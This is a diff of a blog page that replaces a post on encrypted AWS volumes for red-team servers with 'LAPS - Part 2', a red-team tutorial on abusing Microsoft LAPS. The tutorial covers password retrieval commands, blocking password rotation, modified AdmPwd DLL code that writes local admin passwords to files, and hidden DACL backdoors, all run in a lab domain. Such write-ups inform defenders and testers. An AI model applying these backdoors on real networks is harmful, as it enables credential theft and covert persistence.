@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>Red Team Infrastructure - AWS Encrypted EBS</title>
+    <title>LAPS - Part 2</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,19 +31,19 @@
     
 
     
-    <meta name="description" content="Tim MalcomVetter caused a bit of stir over his Responsible Red Teams post last week, which is not surprising since he was pretty fucking rude about the whole thing.
+    <meta name="description" content="In Part 1 we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.
 
 ">
-    <meta property="og:description" content="Tim MalcomVetter caused a bit of stir over his Responsible Red Teams post last week, which is not surprising since he was pretty fucking rude about the whole thing.
+    <meta property="og:description" content="In Part 1 we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Red Team Infrastructure - AWS Encrypted EBS">
-    <meta property="og:url" content="/2018/02/red-team-infrastructure---aws-encrypted-ebs/">
+    <meta property="og:title" content="LAPS - Part 2">
+    <meta property="og:url" content="/2018/03/laps---part-2/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="Tim MalcomVetter caused a bit of stir over his Responsible Red Teams post last week, which is not surprising since he was pretty fucking rude about the whole thing.
+    <meta name="twitter:description" content="In Part 1 we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.
 
 ">
     
@@ -59,7 +59,7 @@
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/enc-ebs/thumb.jpg">
+      <meta property="og:image" content="https://rastamouse.me/images/laps/icon.png">
     
     
     
@@ -251,18 +251,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Red Team Infrastructure - AWS Encrypted EBS
+      LAPS - Part 2
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2018-02-25T00:00:00Z">
+    <time itemprop="datePublished" datetime="2018-03-17T00:00:00Z">
       
   
   
   
   
-    25 February 2018
+    17 March 2018
   
 
     </time>
@@ -283,137 +283,374 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p><a href="https://twitter.com/malcomvetter">Tim MalcomVetter</a> caused a bit of stir over his <a href="https://medium.com/@malcomvetter/responsible-red-teams-1c6209fd43cc">Responsible Red Teams</a> post last week, which is not surprising since he was pretty fucking rude about the whole thing.</p>
+              <p>In <a href="https://rastamouse.me/2018/03/laps---part-1/">Part 1</a> we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.</p>
 
 <p></p>
 
-<blockquote>
-<p>Responsible red teams don’t throw C2 servers all over virtual private cloud providers. Yes, it’s cool, your neat little red team automation script can deploy Empire and Cobalt Strike servers all over Digital Ocean, Linode, AWS, Azure, Google Cloud, with zero clicks &hellip; but why?</p>
-</blockquote>
+<h2 id="retrieving-passwords-ez-mode">Retrieving Passwords EZ Mode</h2>
 
-<p>Considering I have a 2-part series on <a href="https://rastamouse.me/tags/terraform/">automated infrastructure deployment</a>, this comment is more-or-less aimed directly at people like myself, <a href="https://github.com/Coalfire-Research/Red-Baron">byt3bl33d3r</a> and <a href="https://www.blackhillsinfosec.com/build-c2-infrastructure-digital-ocean-part-1/">InvokeThreatGuy</a>.</p>
+<h3 id="admpwd-ps">AdmPwd.PS</h3>
 
-<blockquote>
-<p>are you just an insensitive jerk</p>
-</blockquote>
+<p>If you have access to a computer that has the LAPS PowerShell cmdlets installed, grabbing the password is very straight forward.</p>
 
-<p><code>¯\_(ツ)_/¯</code></p>
+<pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
 
-<p>The ethos behind what Tim was saying however, obviously has merit.</p>
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : q+}W+83O
+ExpirationTimestamp : 16/04/2018 11:25:24
+</code></pre>
 
-<blockquote>
-<p>Our goal is to decrease risk, not increase it. [&hellip;] remember that as simulated attackers, we are really still defenders.</p>
-</blockquote>
+<p>This can also be done using PowerView.</p>
 
-<p>I don&rsquo;t think anybody would argue with this, regardless of which side of the public-cloud-c2 fence you come down on.  However, a blanket statement that <em>all</em> public cloud C2 infrastructure is irresponible, even for attacking production systems, just isn&rsquo;t fair in my opinion.</p>
+<h3 id="powerview">PowerView</h3>
 
-<p>If you, as an operator, have carried out reasonable steps to secure and protect your C2 infrastructure, can articulate those control measures to the target organisation, <em>and</em> they&rsquo;ve approved its use; then you&rsquo;re good.  They are the risk owners (it&rsquo;s their data) and therefore it&rsquo;s their risk to accept.  If it&rsquo;s within their tolerance/appetite, they&rsquo;ll accept it.  If not, they&rsquo;ll reject it.  But that should be their choice, do not make it for them - that&rsquo;s the difference.</p>
+<pre><code>PS H:\&gt; Get-DomainObject -Identity wkstn02 -Properties ms-mcs-admpwd
 
-<h2 id="securing-infrastructure">Securing Infrastructure</h2>
+ms-mcs-admpwd
+-------------
+q+}W+83O
+</code></pre>
 
-<p>In parts <a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/">1</a> and <a href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/">2</a>, we discussed several security configurations such as limiting network access with cloud firewalls and SSH key management.  In this post, we&rsquo;ll look at how to create encrypted EBS volumes for use with AWS EC2 instances.</p>
+<p><code>Get-DomainObject</code> also accepts a <code>-Credential</code> parameter.</p>
 
-<p>AWS doesn&rsquo;t allow us to encrypt an existing AMI, so we can&rsquo;t just take one of their quick start images and spin it up in an encrypted form.  Intead, we have to hop through a one-time process of creating our own encrypted AMI and use that as a base image for later deployment.</p>
+<h2 id="persistence">Persistence</h2>
 
-<h3 id="launch-new-base-instance">Launch New Base Instance</h3>
+<p>As part of the first time LAPS setup <code>Set-AdmPwdComputerSelfPermission</code> is run, which grants permissions for <code>NT AUTHORITY\SYSTEM</code> to update the <code>ms-mcs-admpwd</code> and <code>ms-mcs-admpwdexpirationtime</code> attributes on its own computer object.  Having <code>SYSTEM</code> access on a machine allows you to manually modify these attributes.</p>
 
-<p>So first, create a new instance from an AMI of your choice.</p>
+<h3 id="expiration-time">Expiration Time</h3>
 
-<p><code>EC2 &gt; Instances &gt; Launch Instance</code></p>
+<p>When a computer runs <code>gpupdate</code>, it will check the <code>ms-mcs-admpwdexpirationtime</code> attribute - if that time has elapsed it will update the LAPS password and set a new expiration time.  By extending this time to some absurd value, you can ensure the password is never updated (unless forced with <code>Reset-AdmPwdPassword</code>).</p>
 
-<p>I&rsquo;m using Ubuntu Server 14.04 LTS (HVM), SSD Volume Type:  <code>ami-3fc8d75b</code></p>
+<pre><code>PS H:\&gt; Get-DomainObject -Identity wkstn02 -Properties ms-mcs-admpwdexpirationtime
 
+ms-mcs-admpwdexpirationtime
+---------------------------
+         131678386982930135
+</code></pre>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/base-instance.png" />
-    
-    
-</figure>
+<pre><code>PS C:\&gt; hostname; whoami
+wkstn02
+nt authority\system
 
+PS C:\&gt; Set-DomainObject -Identity wkstn02 -Set @{'ms-mcs-admpwdexpirationtime'='231678386982930135'} -Verbose
+</code></pre>
 
-<p>Once the instance has booted, login and make any customisation you want (instal any software you want, make config changes, apply host hardening etc), then power the instance off.
-See <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki#securing-infrastructure">here</a> for hardening guidance.</p>
+<pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
 
-<h3 id="create-new-image">Create New Image</h3>
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 0yNk}t4a
+ExpirationTimestamp : 01/03/2335 06:44:58
+</code></pre>
 
-<p>From this instance, create a new image:  <code>EC2 &gt; Instances &gt; Actions &gt; Image &gt; Create Image</code></p>
+<h3 id="admpwd-dll">AdmPwd.dll</h3>
 
+<p>This DLL is used by the local computer to carry out all the LAPS functionality.  There is no integrity checking on this DLL, which means it can be replaced with a modified version.  The <a href="https://github.com/jformacek/admpwd">AdmPwd Project</a> source code can be used as a base for compiling our own.</p>
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/create-image.png" />
-    
-    
-</figure>
+<p>This is the portion of code that generates a new password and reports it to AD.</p>
 
+<pre><code class="language-c">//it's time to change the password
+//get local Administrator account we're managing password for
+LogData.dwID = S_GET_ADMIN;
+AdminAccount admin(config.AdminAccountName);
 
-<p>This will create a new AMI that is available to you in: <code>EC2 &gt; AMIs</code></p>
+PasswordGenerator gen(config.PasswordComplexity, config.PasswordLength);
+TCHAR *newPwd = gen.Generate();
+            
+//report new password and timestamp to AD
+GetSystemTimeAsFileTime(&amp;currentTime);
+LogData.dwID = S_REPORT_PWD;
+LogData.hr = comp.ReportPassword(newPwd, &amp;currentTime, config.PasswordAge);
 
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/base-ami.png" />
-    
-    
-</figure>
-
-
-<h2 id="copy-encrypt-ami">Copy &amp; Encrypt AMI</h2>
-
-<p>Now copy the AMI you just created.</p>
-
-<p><code>EC2 &gt; AMIs &gt; Actions &gt; Copy AMI</code></p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/copy-ami.png" />
-    
-    
-</figure>
-
-
-<p>Obviously click the <code>Encryption</code> tickbox :)</p>
-
-<p>There is a default Master Key, but you can specificy your own in the <code>IAM</code> section of the AWS Console.
-I am also copying the AMI to the same region (but you can share across regions too).</p>
-
-<h3 id="new-ami">New AMI</h3>
-
-<p>You will now have a new AMI available, in this example <code>ami-d82fcbbf</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/new-ami.png" />
-    
-    
-</figure>
-
-
-<p>Whenever you want to deploy a new EC2 instance, you can do so from this customised, encrypted AMI.  Deployment options are up to you of course - via the normal GUI or use the AMI number in Terraform.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/enc-ebs/new-instance.png" />
-    
-    
-</figure>
-
-
-<pre><code class="language-text">resource &quot;aws_instance&quot; &quot;http-c2&quot; {
-    ami = &quot;ami-d82fcbbf&quot;
-    instance_type = &quot;t2.medium&quot;
-    key_name = &quot;${aws_key_pair.rasta.key_name}&quot;
-    vpc_security_group_ids = [&quot;${aws_security_group.http-c2.id}&quot;]
-    subnet_id = &quot;${aws_subnet.default.id}&quot;
-    associate_public_ip_address = true
+if (FAILED(LogData.hr))
+    throw LogData.hr;
+else
+{
+    LogData.dwID = S_REPORT_PWD_SUCCESS;
+    LogAppEvent(&amp;LogData);
 }
 </code></pre>
 
-<p>You can now terminate the orginal EC2 instance and deregister the unencrypted AMI.</p>
+<h4 id="write-to-file">Write to File</h4>
+
+<p>In this example, I add a few lines to take the newly generated password and write it to <code>c:\backdoor.txt</code>.  This is just a re-creation of Maxime Clementz and Antoine Goichot&rsquo;s work, which can be found <a href="https://www.youtube.com/watch?v=opSctm4L8kE">here</a>.</p>
+
+<pre><code class="language-c">LogData.hr = comp.ReportPassword(newPwd, &amp;currentTime, config.PasswordAge);
+
+using namespace std;
+wofstream backdoor;
+backdoor.open(&quot;c:\\backdoor.txt&quot;);
+backdoor &lt;&lt; newPwd;
+backdoor.close();
+</code></pre>
+
+<pre><code class="language-text">PS C:\&gt; gpupdate /target:computer /force
+
+PS C:\&gt; ls
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       13/03/2018     21:55                PerfLogs
+d-r---       10/03/2018     14:28                Program Files
+d-r---       16/07/2016     12:47                Program Files (x86)
+d-r---       11/03/2018     12:48                Users
+d-----       13/03/2018     21:55                Windows
+-a----       17/03/2018     10:47             12 backdoor.txt
+
+PS C:\&gt; cat .\backdoor.txt
+3s##5v2BS{70
+</code></pre>
+
+<pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 3s##5v2BS{70
+ExpirationTimestamp : 16/04/2018 11:47:59
+</code></pre>
+
+<h4 id="static-password">Static Password</h4>
+
+<p>You could also force it to set a static password.</p>
+
+<pre><code class="language-c">//TCHAR *newPwd = gen.Generate();
+TCHAR *newPwd = _T(&quot;Static Password!&quot;);
+</code></pre>
+
+<pre><code class="language-text">PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : Static Password!
+ExpirationTimestamp : 16/04/2018 11:50:55
+</code></pre>
+
+<p>Really, the skies the limit here.</p>
+
+<h2 id="admpwd-ps-dll">AdmPwd.PS.dll</h2>
+
+<p>The <code>AdmPwd.PS.dll</code> found in <code>C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS</code> can also be replaced.
+The following source is for the <code>Get-AdmPwdPassword</code> cmdlet.</p>
+
+<pre><code class="language-cs">[Cmdlet(&quot;Get&quot;, &quot;AdmPwdPassword&quot;)]
+public class GetPassword : Cmdlet
+{
+    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
+    public String ComputerName;
+
+    protected override void ProcessRecord()
+    {
+        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
+            {
+                PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
+                WriteObject(pi);
+            }
+        }
+    }
+</code></pre>
+
+<p>Here I add similar lines of code, where the password information is output to file after an administrator asks for it.  Again, you could do a lot more here - exfil them out over C2 for example.</p>
+
+<pre><code class="language-cs">[Cmdlet(&quot;Get&quot;, &quot;AdmPwdPassword&quot;)]
+public class GetPassword : Cmdlet
+{
+    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
+    public String ComputerName;
+
+    protected override void ProcessRecord()
+    {
+        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
+            {
+                PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
+
+                string[] info = { pi.DistinguishedName, pi.Password, (pi.ExpirationTimestamp).ToLongDateString() + &quot; &quot; + (pi.ExpirationTimestamp).ToLongTimeString() };
+                string path = Environment.GetEnvironmentVariable(&quot;TEMP&quot;) + &quot;\\backdoor.txt&quot;;
+                System.IO.File.WriteAllLines(path, info);
+
+                WriteObject(pi);
+            }
+        }
+    }
+</code></pre>
+
+<pre><code>PS H:\&gt; ls $env:temp
+
+    Directory: C:\Users\jlpicard\AppData\Local\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       08/03/2018     21:26                Low
+d-----       17/03/2018     11:15                VirtualBox Dropped Files
+-a----       08/03/2018     21:37              0 Kno132E.tmp
+-a----       08/03/2018     21:39           1512 StructuredQuery.log
+-a----       08/03/2018     21:26            685 wmsetup.log
+</code></pre>
+
+<pre><code>PS H:\&gt; Get-AdmPwdPassword -ComputerName wkstn02 | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : 35.6W5a.
+ExpirationTimestamp : 16/04/2018 12:18:56
+</code></pre>
+
+<pre><code>PS H:\&gt; ls $env:temp
+
+    Directory: C:\Users\jlpicard\AppData\Local\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       08/03/2018     21:26                Low
+d-----       17/03/2018     11:15                VirtualBox Dropped Files
+-a----       17/03/2018     11:19             58 backdoor.txt
+-a----       08/03/2018     21:37              0 Kno132E.tmp
+-a----       08/03/2018     21:39           1512 StructuredQuery.log
+-a----       08/03/2018     21:26            685 wmsetup.log
+</code></pre>
+
+<pre><code>PS H:\&gt; cat C:\Users\jlpicard\AppData\Local\Temp\backdoor.txt
+CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+35.6W5a.
+16 April 2018 12:18:56
+</code></pre>
+
+<h2 id="acls">ACLs</h2>
+
+<p>Once you have something like domain admin, you can modify the principals that have the necessary extended rights over the LAPS attributes to read the passwords.  <code>Find-AdmPwdExtendedRights</code> is the default tool to see this information.</p>
+
+<pre><code class="language-text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &quot;Workstations&quot; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre>
+
+<p>You can also use the default <code>Set-AdmPwdReadPasswordPermission</code> tool to grant permission over an OU to a user/group.</p>
+
+<pre><code class="language-text">PS H:\&gt; Set-AdmPwdReadPasswordPermission -Identity &quot;Workstations&quot; -AllowedPrincipals &quot;LAB\rlaren&quot;
+
+Name                 DistinguishedName                                                 Status
+----                 -----------------                                                 ------
+Workstations         OU=Workstations,DC=testlab,DC=local                               Delegated
+</code></pre>
+
+<p>The obvious downside, is that it will appear under <code>Find-AdmPwdExtendedRights</code>.</p>
+
+<pre><code class="language-text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &quot;Workstations&quot; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\rlaren, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre>
+
+<h3 id="hidden-backdoors">Hidden Backdoors</h3>
+
+<p><a href="https://twitter.com/_wald0">Andy Robbins</a> and <a href="https://twitter.com/harmj0y">Will Schroeder</a> gave an excellent talk at Black Hat US-17 about <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf">DACL backdoors</a>, where they demonstrated (amongst others) that you can add these Extended Rights without <code>Find-AdmPwdExtendedRights</code> being able to see them.</p>
+
+<p>You can do this at the OU and individual Computer level.</p>
+
+<h4 id="ou">OU</h4>
+
+<pre><code class="language-text">PS H:\&gt; $Raw = Get-DomainOU -Raw Workstations
+PS H:\&gt; $Target = $Raw.GetDirectoryEntry()
+PS H:\&gt; $AdmPwdGUID = (Get-DomainGUIDMap).GetEnumerator() | ? { $_.value -eq 'ms-Mcs-AdmPwd' } | select -ExpandProperty name
+PS H:\&gt; $ACE = New-ADObjectAccessControlEntry -InheritanceType Descendents -AccessControlType Allow -PrincipalIdentity rlaren -Right ExtendedRight -ObjectType $AdmPwdGUID
+PS H:\&gt; $Target.PsBase.ObjectSecurity.AddAccessRule($ACE)
+PS H:\&gt; $Target.PsBase.CommitChanges()
+</code></pre>
+
+<pre><code class="language-text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &quot;Workstations&quot; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre>
+
+<pre><code class="language-text">PS H:\&gt; Get-AdmPwdPassword -ComputerName &quot;wkstn02&quot; | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            : s;89}],Q
+ExpirationTimestamp : 16/04/2018 15:09:35
+</code></pre>
+
+<h4 id="computer">Computer</h4>
+
+<pre><code>PS H:\&gt; $Raw = Get-DomainComputer -Identity wkstn01 -Raw
+</code></pre>
+
+<pre><code class="language-text">PS H:\&gt; Get-AdmPwdPassword -ComputerName &quot;wkstn02&quot; | fl
+
+ComputerName        : WKSTN02
+DistinguishedName   : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+Password            :
+ExpirationTimestamp : 16/04/2018 15:09:35
+
+PS H:\&gt; Get-AdmPwdPassword -ComputerName &quot;wkstn01&quot; | fl
+
+ComputerName        : WKSTN01
+DistinguishedName   : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+Password            : 1;/)2okP
+ExpirationTimestamp : 09/04/2018 15:46:17
+</code></pre>
+
+<pre><code class="language-text">PS H:\&gt; Find-AdmPwdExtendedRights -Identity &quot;Workstations&quot; -IncludeComputers | fl
+
+ObjectDN             : OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, LAB\Domain Admins, LAB\Workstation Admins}
+
+ObjectDN             : CN=WKSTN02,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN01,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN03,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+
+ObjectDN             : CN=WKSTN04,OU=Workstations,DC=testlab,DC=local
+ExtendedRightHolders : {NT AUTHORITY\SYSTEM, S-1-5-32-548, LAB\Domain Admins}
+</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>I hope this post gives you some ideas about how LAPS can be abused.  Please hit me up if you think I&rsquo;ve missed anything, or if you want to share any tricks that you may have.</p>
               
             </div>
           </div>
@@ -425,9 +662,13 @@ I am also copying the AMI to the same region (but you can share across regions t
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/red-team/">red team</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/laps/">laps</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/infrastructure/">infrastructure</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/active-directory/">active directory</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/privilege-escalation/">privilege escalation</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/persistence/">persistence</a>
 
                   </div>
                 
@@ -439,7 +680,7 @@ I am also copying the AMI to the same region (but you can share across regions t
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-1/" data-tooltip="LAPS - Part 1">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -447,7 +688,7 @@ I am also copying the AMI to the same region (but you can share across regions t
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/vhd-to-da/" data-tooltip="VHD to DA">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-1/" data-tooltip="LAPS - Part 1">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -464,17 +705,17 @@ I am also copying the AMI to the same region (but you can share across regions t
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -520,7 +761,7 @@ I am also copying the AMI to the same region (but you can share across regions t
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-1/" data-tooltip="LAPS - Part 1">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -528,7 +769,7 @@ I am also copying the AMI to the same region (but you can share across regions t
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/vhd-to-da/" data-tooltip="VHD to DA">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-1/" data-tooltip="LAPS - Part 1">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -545,17 +786,17 @@ I am also copying the AMI to the same region (but you can share across regions t
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2flaps---part-2%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -582,17 +823,17 @@ I am also copying the AMI to the same region (but you can share across regions t
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fred-team-infrastructure---aws-encrypted-ebs%2f">
